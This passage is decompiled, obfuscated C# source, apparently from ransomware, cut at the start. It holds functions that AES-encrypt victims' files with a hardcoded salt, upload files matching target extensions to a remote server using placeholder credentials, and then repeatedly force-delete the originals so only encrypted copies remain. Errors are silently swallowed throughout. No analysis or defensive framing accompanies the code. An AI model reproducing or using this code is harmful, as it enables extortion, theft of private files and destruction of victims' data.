							ZsMLFDBDzuAH(item, item + RoBSIleatdekdR, sFcjbqQpCeL);
						}
						else
						{
							ZsMLFDBDzuAH(item, item + ".part", sFcjbqQpCeL);
						}
						end_IL_00e8_2:;
					}
					catch (Exception)
					{
					}
				}
				IL_0336:;
			}
		});
	}

	private static void wNfDyNaZgcBgGVeuD(string rfVpucfmLCY, string YRyFFDuvFDBvwP, byte[] KoqgmdFAqBw)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(YRyFFDuvFDBvwP, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(KoqgmdFAqBw, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(rfVpucfmLCY, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (YRyFFDuvFDBvwP.Length > 0)
				{
					FileStream fileStream3 = new FileStream(rfVpucfmLCY, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (dZaLbHeSffOykBlbqT == "YES")
					{
						foreach (string item in ptwMCNORHSBSo)
						{
							if (rfVpucfmLCY.ToLower().EndsWith(item) && vexuMasAzwGi == "YES")
							{
								if (Convert.ToInt32(ZaYuJzCvuUhm) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										ccEPHgfBCGDXR.ocQfPPuxiOJiT("URL", "USERNAME", "ACCESO", rfVpucfmLCY);
									}
									catch
									{
									}
								}
							}
							else if (rfVpucfmLCY.ToLower().EndsWith(item) && vexuMasAzwGi == "NO")
							{
								try
								{
									ccEPHgfBCGDXR.ocQfPPuxiOJiT("URL", "USERNAME", "ACCESO", rfVpucfmLCY);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(rfVpucfmLCY) && num2 >= 0)
							{
								File.Delete(rfVpucfmLCY);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (YRyFFDuvFDBvwP.EndsWith(".part"))
					{
						File.Move(YRyFFDuvFDBvwP, YRyFFDuvFDBvwP.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(YRyFFDuvFDBvwP);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private static void ZsMLFDBDzuAH(string DqDjJavbQL, string FgRCdenGzOd, byte[] WBPaVwpCEKC)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string path = FgRCdenGzOd;
			FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(WBPaVwpCEKC, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (QgGVhvIEkwK == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(DqDjJavbQL, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(DqDjJavbQL, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(DqDjJavbQL, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (FgRCdenGzOd.Length > 0)
				{
					FileStream fileStream4 = new FileStream(DqDjJavbQL, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (dZaLbHeSffOykBlbqT == "YES")
					{
						foreach (string item in ptwMCNORHSBSo)
						{
							if (DqDjJavbQL.ToLower().EndsWith(item) && vexuMasAzwGi == "YES")
							{
								if (Convert.ToInt32(ZaYuJzCvuUhm) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										ccEPHgfBCGDXR.ocQfPPuxiOJiT("URL", "USERNAME", "ACCESO", DqDjJavbQL);
									}
									catch
									{
									}
								}
							}
							else if (DqDjJavbQL.ToLower().EndsWith(item) && vexuMasAzwGi == "NO")
							{
								try
								{
									ccEPHgfBCGDXR.ocQfPPuxiOJiT("URL", "USERNAME", "ACCESO", DqDjJavbQL);
								}
								catch
								{
								}
							}
						}
					}
					fileStream4.Dispose();
					new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(DqDjJavbQL);
								break;
							}
							catch
							{
							}
						}
					}).Start();
					if (FgRCdenGzOd.EndsWith(".part"))
					{
						File.Move(FgRCdenGzOd, FgRCdenGzOd.Replace(".part", ""));
					}
					return;
				}
				new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(FgRCdenGzOd))
							{
								File.Delete(FgRCdenGzOd);
							}
							break;
						}
						catch
						{
						}
					}
				}).Start();
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
